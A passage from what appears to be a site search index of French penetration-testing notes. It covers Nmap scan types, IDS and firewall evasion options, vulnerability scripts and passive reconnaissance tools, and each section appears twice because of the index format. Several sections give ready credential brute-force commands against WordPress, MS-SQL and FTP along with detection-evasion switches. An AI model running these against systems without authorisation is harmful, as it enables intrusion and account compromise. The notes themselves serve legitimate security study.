\u00e0 moiti\u00e9 ouvert. Il se lance avec -sS . Nmap va envoyer un requ\u00eate SYN puis s'il re\u00e7oit une r\u00e9ponse SYN/ACK, au lieu d'ouvrir le flux en envoyant un paquet ACK, il envoie un packet RST. Il ferme donc directement le flux mais prend connaissance que le port est ouvert. Avantages : * Il peut \u00eatre utilis\u00e9 pour contourner les anciens syst\u00e8mes de d\u00e9tection d'intrusion, car ils recherchent une poign\u00e9e de main compl\u00e8te \u00e0 trois voies. Ce n'est souvent plus le cas avec les solutions IDS modernes ; c'est pour cette raison que les analyses SYN sont encore souvent appel\u00e9es analyses \"furtives\". * Les analyses SYN ne sont souvent pas enregistr\u00e9es par les applications qui \u00e9coutent sur des ports ouverts, car la pratique courante consiste \u00e0 enregistrer une connexion une fois qu'elle a \u00e9t\u00e9 enti\u00e8rement \u00e9tablie. Une fois de plus, cela contribue \u00e0 l'id\u00e9e que les analyses SYN sont furtives. * Sans avoir \u00e0 se pr\u00e9occuper de l'\u00e9tablissement (et de la d\u00e9connexion) d'une poign\u00e9e de main \u00e0 trois voies pour chaque port, les balayages SYN sont nettement plus rapides qu'un balayage TCP Connect standard. Inconv\u00e9nients : * Ils n\u00e9cessitent les permissions sudo pour fonctionner correctement sous Linux. En effet, les analyses SYN n\u00e9cessitent la capacit\u00e9 de cr\u00e9er des paquets bruts (par opposition \u00e0 la poign\u00e9e de main TCP compl\u00e8te), ce qui est un privil\u00e8ge que seul l'utilisateur root poss\u00e8de par d\u00e9faut. * Les services instables sont parfois interrompus par les analyses SYN, ce qui peut s'av\u00e9rer probl\u00e9matique si un client a fourni un environnement de production pour le test. En d\u00e9finitive, les avantages l'emportent sur les inconv\u00e9nients. Pour cette raison, les scans SYN sont les scans par d\u00e9faut utilis\u00e9s par Nmap s'il est ex\u00e9cut\u00e9 avec les permissions sudo. S'il est ex\u00e9cut\u00e9 sans les permissions sudo, Nmap utilise par d\u00e9faut le scan TCP Connect que nous avons vu dans la t\u00e2che pr\u00e9c\u00e9dente","title":"Scan SYN (scan de base de Nmap en sudo)"},{"location":"nmap_bases_scan/#scan-udp","text":"Les scans UDP sont tr\u00e8s lent car le protocole UDP est fait pour la rapidit\u00e9 et n'a pas \"d'accus\u00e9 de r\u00e9ception\", on peut connaitre les ports ferm\u00e9s mais on ne peut pas diff\u00e9rencier les ports ouverts de ceux bloqu\u00e9s par firewall (et qui drop les paquets). On l'active avec -sU . Lorsqu'un paquet est envoy\u00e9 \u00e0 un port UDP ouvert, il ne devrait pas y avoir de r\u00e9ponse. Lorsque cela se produit, Nmap se r\u00e9f\u00e8re au port comme \u00e9tant ouvert|filtr\u00e9. En d'autres termes, il suspecte que le port est ouvert, mais qu'il pourrait \u00eatre prot\u00e9g\u00e9 par un pare-feu. S'il obtient une r\u00e9ponse UDP (ce qui est tr\u00e8s inhabituel), le port est marqu\u00e9 comme ouvert. Le plus souvent, il n'y a pas de r\u00e9ponse, auquel cas la demande est envoy\u00e9e une deuxi\u00e8me fois pour une double v\u00e9rification. S'il n'y a toujours pas de r\u00e9ponse, le port est marqu\u00e9 comme ouvert|filtr\u00e9 et Nmap continue. Lorsqu'un paquet est envoy\u00e9 \u00e0 un port UDP ferm\u00e9, la cible doit r\u00e9pondre par un paquet ICMP (ping) contenant un message indiquant que le port est inaccessible. Cela identifie clairement les ports ferm\u00e9s, que Nmap marque comme tels et passe \u00e0 autre chose. *Lorsqu'il scanne des ports UDP, Nmap envoie g\u00e9n\u00e9ralement des requ\u00eates compl\u00e8tement vides - juste des paquets UDP bruts. Cela dit, pour les ports qui sont g\u00e9n\u00e9ralement occup\u00e9s par des services bien connus, il enverra plut\u00f4t une charge utile sp\u00e9cifique au protocole qui est plus susceptible de susciter une r\u00e9ponse \u00e0 partir de laquelle un r\u00e9sultat plus pr\u00e9cis peut \u00eatre tir\u00e9. *","title":"Scan UDP"},{"location":"nmap_bases_scan/#ameliorer-la-rapidite-du-scan","text":"Comme le scan UDP est uuuuultra lent on peut le lancer que sur les ports les plus connus/fr\u00e9quement utilis\u00e9s. Par exemple si on veut faire le scan que sur les 50 ports les plus connus on peut faire : --top-ports 50 On peut faire \u00e7a avec n'importe quel type de scan mais celui avec lequel c'est le plus utilis\u00e9 est avec le scan udp : nmap -sU --top-ports 50 192.10.0.5","title":"Am\u00e9liorer la rapidit\u00e9 du scan"},{"location":"nmap_bases_scan/#contourner-les-firewall","text":"Ces 3 scans sont encore un peu plus furtifs que le scan SYN. L'objectif ici est, bien s\u00fbr, d'\u00e9chapper aux pare-feux. De nombreux pare-feux sont configur\u00e9s pour rejeter les paquets TCP entrants vers les ports bloqu\u00e9s qui ont le drapeau SYN activ\u00e9 (bloquant ainsi les nouvelles demandes d'\u00e9tablissement de connexion). En envoyant des demandes qui ne contiennent pas le drapeau SYN, nous contournons efficacement ce type de pare-feu. Bien que ce soit une bonne chose en th\u00e9orie, la plupart des solutions IDS modernes sont sensibles \u00e0 ces types d'analyse, il ne faut donc pas compter sur leur efficacit\u00e9 \u00e0 100 % lorsqu'il s'agit de syst\u00e8mes modernes. Attention, en pratique Microsoft Windows (et un grand nombre de dispositifs de r\u00e9seau Cisco) sont connus pour r\u00e9pondre par un RST \u00e0 tout paquet TCP malform\u00e9, que le port soit ouvert ou non. Il en r\u00e9sulte que tous les ports apparaissent comme \u00e9tant ferm\u00e9s.","title":"Contourner les firewall"},{"location":"nmap_bases_scan/#scan-null-sn","text":"Simplement, le scan envoie une requ\u00eate TCP remplie de 0 et attend en retour une r\u00e9ponse de RST.","title":"Scan NULL -sN"},{"location":"nmap_bases_scan/#scan-fin-sf","text":"Le scan envoie une requ\u00eate TCP avec uniquement le bit de \"FIN\" d'activ\u00e9 et s'attend \u00e0 une r\u00e9ponse RST.","title":"Scan FIN -sF"},{"location":"nmap_bases_scan/#scan-xmas-sx","text":"Le scan envoie un req\u00eate TCP avec les bits Urgent(URG), Push (PSH) et Fin (FIN) d'activ\u00e9s","title":"Scan Xmas -sX"},{"location":"nmap_bases_scan/#rappel-sur-la-structure-dun-flag-tcpip","text":"3 octets compos\u00e9s de : * 3 bits r\u00e9serv\u00e9s - 1 bit \"Nonce\" * 1 bit CWR (Congestion Windows Reduced) - 1 bit ECN (Echo) - 1 bit URG (Urgent) - 1 bit ACK (Acknoledgement) * 1 bit PSH (Push) - 1 bit RST (Reset) - 1 bit SYN (Synchronisation) - 1 bit FIN","title":"Rappel sur la structure d'un flag TCP/IP :"},{"location":"nmap_bases_utiles/","text":"Les bases de Nmap : des fonctionnalit\u00e9s utiles Enregistrer le r\u00e9sultat \u00e7a peut \u00eatre pratique d'enregistrer le r\u00e9sultat d'un scan. L\u2019option -oN permet d\u2019enregistrer le r\u00e9sultat du portscan dans un fichier au format texte : nmap -oN output.txt 192.168.1.1 Pour enregistrer le r\u00e9sultat du scan de port dans un fichier au format XML : nmap -oX output.xml 192.168.1.1 Analyser un h\u00f4te ou un r\u00e9seau Scanner plusieurs h\u00f4tes En param\u00e8tre : nmap [ip1] [ip2] [ip3] Avec une liste pr\u00e9d\u00e9finie : nmap -iL chemin/liste_ip.txt On peut directement mettre une adresse web en param\u00e8tre : nmap www.google.com Exclure IP ou H\u00f4tes ou R\u00e9seaux En param\u00e8tre : nmap 192.168.1.0/24 --exclude 192.168.1.1 nmap 192.168.1.0/24 --exclude 192.168.1.1 192.168.1.5 nmap 192.168.1.0/24 --exclude 192.168.1.1,2,3 Depuis une liste : nmap 192.168.1.0/24 --excludefile exclusion.txt Scanner des ports en particulier Il faut pr\u00e9ciser le type de protocole utilis\u00e9 par le port : T pour TCP/IP, U pour UDP Exemple : nmap -p T:80 [ip] nmap -p U:53 [ip] nmap -p T:1-1024 [ip] nmap -p U:53,9,113,T:21-25,80,443,8080 [ip] On peut obtenir toutes les infos possibles sur un port en particulier en lan\u00e7ant la commande : nmap -p [port] -A [ip] Attention : cette commande est longue \u00e0 s'ex\u00e9cuter donc il faut bien la limiter \u00e0 un seul et unique port. Recherche num\u00e9ro de version On peut trouver le num\u00e9ro de version du service qui s'ex\u00e9cute sur des h\u00f4tes avec : nmap -sV [ip] Trouver l'OS En utilisant l'option -O D\u00e9sactiver les requ\u00eates ping C'est tr\u00e8s utile car certains parefeu bloque par d\u00e9faut toutes les requ\u00eates ICMP (ping) et nmap ping par d\u00e9faut donc une cible peut \u00eatre enregistr\u00e9e comme down juste \u00e0 cause de \u00e7a. nmap -Pn [ip] D\u00e9sactiver la r\u00e9solution DNS nmap -n [ip] Changer de type de scan L\u2019option -P permet de changer le type de scan : -Pn : Traitez tous les h\u00f4tes comme en ligne \u2013 ignorez la d\u00e9couverte des h\u00f4tes -PS/PA/PU/PY[portlist] : TCP SYN/ACK, UDP or SCTP d\u00e9couverte vers des ports donn\u00e9s -PE / PP / PM : sondes de d\u00e9couverte d\u2019\u00e9cho, d\u2019horodatage et de demande de masque de r\u00e9seau ICMP -PO [liste de protocoles] : Ping de protocole IP Exemples : Analyser les h\u00f4tes distants \u00e0 l\u2019aide de TCP ACK (PA) et TCP Syn (PS) : nmap -PS 192.168.1.1 Analyser l\u2019h\u00f4te distant pour des ports sp\u00e9cifiques avec TCP ACK : nmap -PA -p 22,80 192.168.1.1 Utiliser des scripts Le Nmap Scripting Engine (NSE) est un ajout incroyablement puissant \u00e0 Nmap, qui \u00e9tend consid\u00e9rablement ses fonctionnalit\u00e9s. Les scripts NSE sont \u00e9crits dans le langage de programmation Lua, et peuvent \u00eatre utilis\u00e9s pour faire une vari\u00e9t\u00e9 de choses : de l'analyse des vuln\u00e9rabilit\u00e9s, \u00e0 l'automatisation des exploits pour ces vuln\u00e9rabilit\u00e9s. Le NSE est particuli\u00e8rement utile pour la reconnaissance, mais il convient de garder \u00e0 l'esprit l'\u00e9tendue de la biblioth\u00e8que de scripts. De nombreuses cat\u00e9gories sont disponibles. Parmi les cat\u00e9gories utiles, on peut citer safe : n'affectera pas la cible intrusive : pas s\u00fbr : susceptible d'affecter la cible vuln : recherche de vuln\u00e9rabilit\u00e9s exploit : Tentative d'exploitation d'une vuln\u00e9rabilit\u00e9 auth : Tentative de contournement de l'authentification pour les services en cours d'ex\u00e9cution (par exemple, connexion anonyme \u00e0 un serveur FTP) brute : Tentative de forcer les informations d'identification des services en cours d'ex\u00e9cution. discovery : Tenter d'interroger les services en cours d'ex\u00e9cution pour obtenir des informations suppl\u00e9mentaires sur le r\u00e9seau (par exemple, interroger un serveur SNMP). Une liste plus exhaustive est disponible ici . Scanner les vuln\u00e9rabilit\u00e9s Il existe un script pr\u00e9d\u00e9fini pr\u00e9sent dans la commande dans Nmap qui permet aux utilisateurs d\u2019ex\u00e9cuter un scan de vuln\u00e9rabilit\u00e9s. Cela est donc tr\u00e8s pratique pour s\u2019assurer que votre syst\u00e8me est \u00e0 jour et non vuln\u00e9rable. On peut utiliser ces scripts pr\u00e9d\u00e9finis ou poss\u00e9der leur langage de programmation Lua pour d\u00e9river une fonctionnalit\u00e9 sp\u00e9cifique qui peut aider \u00e0 la d\u00e9tection CVE. Pour cela, on utilise l\u2019option -script vuln : nmap -Pn \u2013script vuln [ip] On peut simplement utiliser le v\u00e9rificateur de logiciels malveillants Google SafeBrowsing par la commande: nmap -p80 \u2013script http-google-malware www.malekal.com Pour aller plus loin On peut utiliser un script disponible sur git pour avoir plus de vuln\u00e9rabilit\u00e9s check\u00e9s. Etape 1 : Se mettre dans le r\u00e9pertoire : cd /usr/share/nmap/scripts Etape 2 : Cloner le repo : git clone https://github.com/vulnersCom/nmap-vulners.git Etape 3 : Utiliser vulners: nmap -sV --script nmap-vulners/ [ip cible] Lancer une attaque brutforce On utilise l\u2019option -script pour sp\u00e9cifier le type d\u2019attaque. nmap -sV \u2013script http-wordpress-brute \u2013script-args \u2018userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com, http-wordpress-brute.threads=3,brute.firstonly=true\u2019 [ip] Contre MS-SQL nmap -p 1433 \u2013script ms-sql-brute \u2013script-args userdb=customuser.txt,passdb=custompass.txt [ip] Contre FTP nmap \u2013script ftp-brute -p 21 192.168.1.105 Contourner un firewall tips Utiliser les switch -sN , -sF ou -sX Se r\u00e9f\u00e9rer au document La base de Nmap : les scans Bloquer les requ\u00eates ICMP Votre h\u00f4te Windows typique, avec son pare-feu par d\u00e9faut, bloque tous les paquets ICMP. Cela pose un probl\u00e8me : non seulement nous utilisons souvent ping pour \u00e9tablir manuellement l'activit\u00e9 d'une cible, mais Nmap fait la m\u00eame chose par d\u00e9faut. Cela signifie que Nmap enregistrera un h\u00f4te avec cette configuration de pare-feu comme mort et ne prendra pas la peine de le scanner. Nous avons donc besoin d'un moyen de contourner cette configuration. Heureusement, Nmap fournit une option pour cela : -Pn , qui dit \u00e0 Nmap de ne pas prendre la peine d'envoyer un ping \u00e0 l'h\u00f4te avant de le scanner. Cela signifie que Nmap traitera toujours le(s) h\u00f4te(s) cible(s) comme \u00e9tant vivant(s), contournant ainsi le bloc ICMP ; cependant, cela a pour prix de prendre potentiellement beaucoup de temps pour compl\u00e9ter le scan (si l'h\u00f4te est vraiment mort, alors Nmap v\u00e9rifiera et rev\u00e9rifiera chaque port sp\u00e9cifi\u00e9). Fragmenter le paquet -f : Utilis\u00e9 pour fragmenter les paquets (c'est-\u00e0-dire les diviser en petits morceaux), ce qui r\u00e9duit la probabilit\u00e9 que les paquets soient d\u00e9tect\u00e9s par un pare-feu ou un syst\u00e8me de d\u00e9tection d'intrusion. --mtu <nombre> : Comme -f mais avec plus de contr\u00f4le. Accepte une taille maximale d'unit\u00e9 de transmission \u00e0 utiliser pour les paquets envoy\u00e9s. Il doit s'agir d'un multiple de 8. Ajouter un d\u00e9lai --scan-delay <time>ms : Utilis\u00e9 pour ajouter un d\u00e9lai entre les paquets envoy\u00e9s. C'est tr\u00e8s utile si le r\u00e9seau est instable, mais aussi pour \u00e9viter les d\u00e9clenchements de pare-feu/IDS bas\u00e9s sur le temps qui peuvent \u00eatre en place. Faire une mauvaise checksum --badsum : Est utilis\u00e9 pour g\u00e9n\u00e9rer une somme de contr\u00f4le invalide pour les paquets. Toute pile TCP/IP r\u00e9elle laisserait tomber ce paquet, mais les pare-feux peuvent potentiellement r\u00e9pondre automatiquement, sans prendre la peine de v\u00e9rifier la somme de contr\u00f4le du paquet. Ainsi, ce commutateur peut \u00eatre utilis\u00e9 pour d\u00e9terminer la pr\u00e9sence d'un pare-feu/IDS. Autres options utiles \u2013exclude : Exclure des h\u00f4tes du scan -n : D\u00e9sactiver la r\u00e9solution DNS \u2013open : Afficher que les ports ouverts -oN : Enregistrer le r\u00e9sultat du scan dans un fichier au formate texte -oX : Enregistrer le r\u00e9sultat du scan dans un fichier au formate XML -p : Sp\u00e9cifier les ports r\u00e9seaux \u00e0 scanner -Pn : D\u00e9sactiver la d\u00e9couverte d\u2019h\u00f4te -r : Analyser les ports cons\u00e9cutivement -sT : Faire un scan de port TCP -sU : Faire un scan de port UDP -sV : Trouver les versions du service -script : Utilise un script interne \u00e0 nmap pour scan de vuln\u00e9rabilit\u00e9, bruteforce, etc -v : -vv : Mode bavard","title":"Utile"},{"location":"nmap_bases_utiles/#les-bases-de-nmap-des-fonctionnalites-utiles","text":"","title":"Les bases de Nmap : des fonctionnalit\u00e9s utiles"},{"location":"nmap_bases_utiles/#enregistrer-le-resultat","text":"\u00e7a peut \u00eatre pratique d'enregistrer le r\u00e9sultat d'un scan. L\u2019option -oN permet d\u2019enregistrer le r\u00e9sultat du portscan dans un fichier au format texte : nmap -oN output.txt 192.168.1.1 Pour enregistrer le r\u00e9sultat du scan de port dans un fichier au format XML : nmap -oX output.xml 192.168.1.1","title":"Enregistrer le r\u00e9sultat"},{"location":"nmap_bases_utiles/#analyser-un-hote-ou-un-reseau","text":"","title":"Analyser un h\u00f4te ou un r\u00e9seau"},{"location":"nmap_bases_utiles/#scanner-plusieurs-hotes","text":"En param\u00e8tre : nmap [ip1] [ip2] [ip3] Avec une liste pr\u00e9d\u00e9finie : nmap -iL chemin/liste_ip.txt On peut directement mettre une adresse web en param\u00e8tre : nmap www.google.com","title":"Scanner plusieurs h\u00f4tes"},{"location":"nmap_bases_utiles/#exclure-ip-ou-hotes-ou-reseaux","text":"En param\u00e8tre : nmap 192.168.1.0/24 --exclude 192.168.1.1 nmap 192.168.1.0/24 --exclude 192.168.1.1 192.168.1.5 nmap 192.168.1.0/24 --exclude 192.168.1.1,2,3 Depuis une liste : nmap 192.168.1.0/24 --excludefile exclusion.txt","title":"Exclure  IP ou H\u00f4tes ou R\u00e9seaux"},{"location":"nmap_bases_utiles/#scanner-des-ports-en-particulier","text":"Il faut pr\u00e9ciser le type de protocole utilis\u00e9 par le port : T pour TCP/IP, U pour UDP Exemple : nmap -p T:80 [ip] nmap -p U:53 [ip] nmap -p T:1-1024 [ip] nmap -p U:53,9,113,T:21-25,80,443,8080 [ip] On peut obtenir toutes les infos possibles sur un port en particulier en lan\u00e7ant la commande : nmap -p [port] -A [ip] Attention : cette commande est longue \u00e0 s'ex\u00e9cuter donc il faut bien la limiter \u00e0 un seul et unique port.","title":"Scanner des ports en particulier"},{"location":"nmap_bases_utiles/#recherche-numero-de-version","text":"On peut trouver le num\u00e9ro de version du service qui s'ex\u00e9cute sur des h\u00f4tes avec : nmap -sV [ip]","title":"Recherche num\u00e9ro de version"},{"location":"nmap_bases_utiles/#trouver-los","text":"En utilisant l'option -O","title":"Trouver l'OS"},{"location":"nmap_bases_utiles/#desactiver-les-requetes-ping","text":"C'est tr\u00e8s utile car certains parefeu bloque par d\u00e9faut toutes les requ\u00eates ICMP (ping) et nmap ping par d\u00e9faut donc une cible peut \u00eatre enregistr\u00e9e comme down juste \u00e0 cause de \u00e7a. nmap -Pn [ip]","title":"D\u00e9sactiver les requ\u00eates ping"},{"location":"nmap_bases_utiles/#desactiver-la-resolution-dns","text":"nmap -n [ip]","title":"D\u00e9sactiver la r\u00e9solution DNS"},{"location":"nmap_bases_utiles/#changer-de-type-de-scan","text":"L\u2019option -P permet de changer le type de scan : -Pn : Traitez tous les h\u00f4tes comme en ligne \u2013 ignorez la d\u00e9couverte des h\u00f4tes -PS/PA/PU/PY[portlist] : TCP SYN/ACK, UDP or SCTP d\u00e9couverte vers des ports donn\u00e9s -PE / PP / PM : sondes de d\u00e9couverte d\u2019\u00e9cho, d\u2019horodatage et de demande de masque de r\u00e9seau ICMP -PO [liste de protocoles] : Ping de protocole IP Exemples : Analyser les h\u00f4tes distants \u00e0 l\u2019aide de TCP ACK (PA) et TCP Syn (PS) : nmap -PS 192.168.1.1 Analyser l\u2019h\u00f4te distant pour des ports sp\u00e9cifiques avec TCP ACK : nmap -PA -p 22,80 192.168.1.1","title":"Changer de type de scan"},{"location":"nmap_bases_utiles/#utiliser-des-scripts","text":"Le Nmap Scripting Engine (NSE) est un ajout incroyablement puissant \u00e0 Nmap, qui \u00e9tend consid\u00e9rablement ses fonctionnalit\u00e9s. Les scripts NSE sont \u00e9crits dans le langage de programmation Lua, et peuvent \u00eatre utilis\u00e9s pour faire une vari\u00e9t\u00e9 de choses : de l'analyse des vuln\u00e9rabilit\u00e9s, \u00e0 l'automatisation des exploits pour ces vuln\u00e9rabilit\u00e9s. Le NSE est particuli\u00e8rement utile pour la reconnaissance, mais il convient de garder \u00e0 l'esprit l'\u00e9tendue de la biblioth\u00e8que de scripts. De nombreuses cat\u00e9gories sont disponibles. Parmi les cat\u00e9gories utiles, on peut citer safe : n'affectera pas la cible intrusive : pas s\u00fbr : susceptible d'affecter la cible vuln : recherche de vuln\u00e9rabilit\u00e9s exploit : Tentative d'exploitation d'une vuln\u00e9rabilit\u00e9 auth : Tentative de contournement de l'authentification pour les services en cours d'ex\u00e9cution (par exemple, connexion anonyme \u00e0 un serveur FTP) brute : Tentative de forcer les informations d'identification des services en cours d'ex\u00e9cution. discovery : Tenter d'interroger les services en cours d'ex\u00e9cution pour obtenir des informations suppl\u00e9mentaires sur le r\u00e9seau (par exemple, interroger un serveur SNMP). Une liste plus exhaustive est disponible ici .","title":"Utiliser des scripts"},{"location":"nmap_bases_utiles/#scanner-les-vulnerabilites","text":"Il existe un script pr\u00e9d\u00e9fini pr\u00e9sent dans la commande dans Nmap qui permet aux utilisateurs d\u2019ex\u00e9cuter un scan de vuln\u00e9rabilit\u00e9s. Cela est donc tr\u00e8s pratique pour s\u2019assurer que votre syst\u00e8me est \u00e0 jour et non vuln\u00e9rable. On peut utiliser ces scripts pr\u00e9d\u00e9finis ou poss\u00e9der leur langage de programmation Lua pour d\u00e9river une fonctionnalit\u00e9 sp\u00e9cifique qui peut aider \u00e0 la d\u00e9tection CVE. Pour cela, on utilise l\u2019option -script vuln : nmap -Pn \u2013script vuln [ip] On peut simplement utiliser le v\u00e9rificateur de logiciels malveillants Google SafeBrowsing par la commande: nmap -p80 \u2013script http-google-malware www.malekal.com","title":"Scanner les vuln\u00e9rabilit\u00e9s"},{"location":"nmap_bases_utiles/#pour-aller-plus-loin","text":"On peut utiliser un script disponible sur git pour avoir plus de vuln\u00e9rabilit\u00e9s check\u00e9s. Etape 1 : Se mettre dans le r\u00e9pertoire : cd /usr/share/nmap/scripts Etape 2 : Cloner le repo : git clone https://github.com/vulnersCom/nmap-vulners.git Etape 3 : Utiliser vulners: nmap -sV --script nmap-vulners/ [ip cible]","title":"Pour aller plus loin"},{"location":"nmap_bases_utiles/#lancer-une-attaque-brutforce","text":"On utilise l\u2019option -script pour sp\u00e9cifier le type d\u2019attaque. nmap -sV \u2013script http-wordpress-brute \u2013script-args \u2018userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com, http-wordpress-brute.threads=3,brute.firstonly=true\u2019 [ip]","title":"Lancer une attaque brutforce"},{"location":"nmap_bases_utiles/#contre-ms-sql","text":"nmap -p 1433 \u2013script ms-sql-brute \u2013script-args userdb=customuser.txt,passdb=custompass.txt [ip]","title":"Contre MS-SQL"},{"location":"nmap_bases_utiles/#contre-ftp","text":"nmap \u2013script ftp-brute -p 21 192.168.1.105","title":"Contre FTP"},{"location":"nmap_bases_utiles/#contourner-un-firewall-tips","text":"","title":"Contourner un firewall tips"},{"location":"nmap_bases_utiles/#utiliser-les-switch-sn-sf-ou-sx","text":"Se r\u00e9f\u00e9rer au document La base de Nmap : les scans","title":"Utiliser les switch -sN, -sF ou -sX"},{"location":"nmap_bases_utiles/#bloquer-les-requetes-icmp","text":"Votre h\u00f4te Windows typique, avec son pare-feu par d\u00e9faut, bloque tous les paquets ICMP. Cela pose un probl\u00e8me : non seulement nous utilisons souvent ping pour \u00e9tablir manuellement l'activit\u00e9 d'une cible, mais Nmap fait la m\u00eame chose par d\u00e9faut. Cela signifie que Nmap enregistrera un h\u00f4te avec cette configuration de pare-feu comme mort et ne prendra pas la peine de le scanner. Nous avons donc besoin d'un moyen de contourner cette configuration. Heureusement, Nmap fournit une option pour cela : -Pn , qui dit \u00e0 Nmap de ne pas prendre la peine d'envoyer un ping \u00e0 l'h\u00f4te avant de le scanner. Cela signifie que Nmap traitera toujours le(s) h\u00f4te(s) cible(s) comme \u00e9tant vivant(s), contournant ainsi le bloc ICMP ; cependant, cela a pour prix de prendre potentiellement beaucoup de temps pour compl\u00e9ter le scan (si l'h\u00f4te est vraiment mort, alors Nmap v\u00e9rifiera et rev\u00e9rifiera chaque port sp\u00e9cifi\u00e9).","title":"Bloquer les requ\u00eates ICMP"},{"location":"nmap_bases_utiles/#fragmenter-le-paquet","text":"-f : Utilis\u00e9 pour fragmenter les paquets (c'est-\u00e0-dire les diviser en petits morceaux), ce qui r\u00e9duit la probabilit\u00e9 que les paquets soient d\u00e9tect\u00e9s par un pare-feu ou un syst\u00e8me de d\u00e9tection d'intrusion. --mtu <nombre> : Comme -f mais avec plus de contr\u00f4le. Accepte une taille maximale d'unit\u00e9 de transmission \u00e0 utiliser pour les paquets envoy\u00e9s. Il doit s'agir d'un multiple de 8.","title":"Fragmenter le paquet"},{"location":"nmap_bases_utiles/#ajouter-un-delai","text":"--scan-delay <time>ms : Utilis\u00e9 pour ajouter un d\u00e9lai entre les paquets envoy\u00e9s. C'est tr\u00e8s utile si le r\u00e9seau est instable, mais aussi pour \u00e9viter les d\u00e9clenchements de pare-feu/IDS bas\u00e9s sur le temps qui peuvent \u00eatre en place.","title":"Ajouter un d\u00e9lai"},{"location":"nmap_bases_utiles/#faire-une-mauvaise-checksum","text":"--badsum : Est utilis\u00e9 pour g\u00e9n\u00e9rer une somme de contr\u00f4le invalide pour les paquets. Toute pile TCP/IP r\u00e9elle laisserait tomber ce paquet, mais les pare-feux peuvent potentiellement r\u00e9pondre automatiquement, sans prendre la peine de v\u00e9rifier la somme de contr\u00f4le du paquet. Ainsi, ce commutateur peut \u00eatre utilis\u00e9 pour d\u00e9terminer la pr\u00e9sence d'un pare-feu/IDS.","title":"Faire une mauvaise checksum"},{"location":"nmap_bases_utiles/#autres-options-utiles","text":"\u2013exclude : Exclure des h\u00f4tes du scan -n : D\u00e9sactiver la r\u00e9solution DNS \u2013open : Afficher que les ports ouverts -oN : Enregistrer le r\u00e9sultat du scan dans un fichier au formate texte -oX : Enregistrer le r\u00e9sultat du scan dans un fichier au formate XML -p : Sp\u00e9cifier les ports r\u00e9seaux \u00e0 scanner -Pn : D\u00e9sactiver la d\u00e9couverte d\u2019h\u00f4te -r : Analyser les ports cons\u00e9cutivement -sT : Faire un scan de port TCP -sU : Faire un scan de port UDP -sV : Trouver les versions du service -script : Utilise un script interne \u00e0 nmap pour scan de vuln\u00e9rabilit\u00e9, bruteforce, etc -v : -vv : Mode bavard","title":"Autres options utiles"},{"location":"reconnaissance_passive/","text":"Outils de reconnaissance passive La reconnaissance passive consiste \u00e0 rassembler des informations sur la cible sans directement se connecter avec elle. Cela se fait principalement en se connectant \u00e0 des bases de donn\u00e9es publiques. Whois WHOIS est un protocole de demande et de r\u00e9ponse qui suit la sp\u00e9cification RFC 3912. Un serveur WHOIS \u00e9coute les demandes entrantes sur le port TCP 43. L'agent d'enregistrement du domaine est responsable de la mise \u00e0 jour des enregistrements WHOIS pour les noms de domaine qu'il loue. Le serveur WHOIS r\u00e9pond en fournissant diverses informations relatives au domaine demand\u00e9. En particulier, nous pouvons apprendre ce qui suit : Registrar : Par l'interm\u00e9diaire de quel bureau d'enregistrement le nom de domaine a-t-il \u00e9t\u00e9 enregistr\u00e9 ? Contact info of registrant : Nom, organisation, adresse, t\u00e9l\u00e9phone, entre autres. (sauf si elles sont cach\u00e9es par un service de protection de la vie priv\u00e9e) Creation, update and expiration : Quand le nom de domaine a-t-il \u00e9t\u00e9 enregistr\u00e9 pour la premi\u00e8re fois ? Quand a-t-il \u00e9t\u00e9 mis \u00e0 jour pour la derni\u00e8re fois ? Et quand doit-il \u00eatre renouvel\u00e9 ? Name Server : Quel est le serveur auquel il faut s'adresser pour r\u00e9soudre le nom de domaine ? whois google.com Gr\u00e2ce \u00e0 whois on s'int\u00e9resse le plus souvent au serveur DNS utilis\u00e9. nslookup et dig nslookup signifie Name Server Look Up, \u00e7a permet de retrouver l'adresse IP d'un nom de domaine. La synthaxe est : nslookup [option] [nom de domaine] [serveur DNS \u00e0 interroger] Les serveurs DNS les plus connus sont : * Cloudflare avec 1.1.1.1 et 1.0.0.1 * Google avec 8.8.8.8 et 8.8.4.4 * Quad9 avec 9.9.9.9 et 149.112.112.112 Dans la partie [option] on peut choisir le type de r\u00e9sultat que l'on veut : option effet -type=A adresse IPv4 -type=AAAA adresse IPv6 -type=CNAME Nom Canonique -type=MX serveur mail -type=SOA \"Start of Authority\" -type=TXT TXT record dig Pour des requ\u00eates DNS plus avanc\u00e9es et des fonctionnalit\u00e9s suppl\u00e9mentaires, on peut utiliser dig (Domain Information Groper) Comme pour nslookup on peut pr\u00e9ciser un type mais pas besoin de mettre \"-type=\", par exemple : dig test.com MX Pour pr\u00e9ciser le serveur DNS, on ajoute '@' : dig @8.8.8.8 test.com MX DNSDumpster DNSDumpster est un site qui permet de lister un certains nombre de sous-domaines. Et de faire un rendu visuel du mappage du site. Les outils de recherche DNS, tels que nslookup et dig, ne peuvent pas trouver les sous-domaines seuls. Le domaine que vous inspectez peut inclure un sous-domaine diff\u00e9rent qui peut r\u00e9v\u00e9ler beaucoup d'informations sur la cible. Par exemple, si tryhackme.com poss\u00e8de les sous-domaines wiki.tryhackme.com et webmail.tryhackme.com, vous voudrez en savoir plus sur ces deux sous-domaines, car ils peuvent contenir une mine d'informations sur votre cible. Il est possible que l'un de ces sous-domaines ait \u00e9t\u00e9 cr\u00e9\u00e9 et ne soit pas mis \u00e0 jour r\u00e9guli\u00e8rement. L'absence de mises \u00e0 jour r\u00e9guli\u00e8res entra\u00eene g\u00e9n\u00e9ralement la vuln\u00e9rabilit\u00e9 des services. Shodan Shodan est un site internet qui peut \u00eatre utile pour obtenir diverses informations sur le r\u00e9seau du client, sans s'y connecter activement. En outre, du c\u00f4t\u00e9 d\u00e9fensif, vous pouvez utiliser diff\u00e9rents services de Shodan.io pour conna\u00eetre les appareils connect\u00e9s et expos\u00e9s appartenant \u00e0 votre organisation. Shodan.io essaie de se connecter \u00e0 chaque appareil accessible en ligne pour construire un moteur de recherche de \"choses\" connect\u00e9es, contrairement \u00e0 un moteur de recherche de pages web. D\u00e8s qu'il obtient une r\u00e9ponse, il collecte toutes les informations relatives au service et les enregistre dans la base de donn\u00e9es pour les rendre consultables.","title":"Reconnaissance Passive"},{"location":"reconnaissance_passive/#outils-de-reconnaissance-passive","text":"La reconnaissance passive consiste \u00e0 rassembler des informations sur la cible sans directement se connecter avec elle. Cela se fait principalement en se connectant \u00e0 des bases de donn\u00e9es publiques.","title":"Outils de reconnaissance passive"},{"location":"reconnaissance_passive/#whois","text":"WHOIS est un 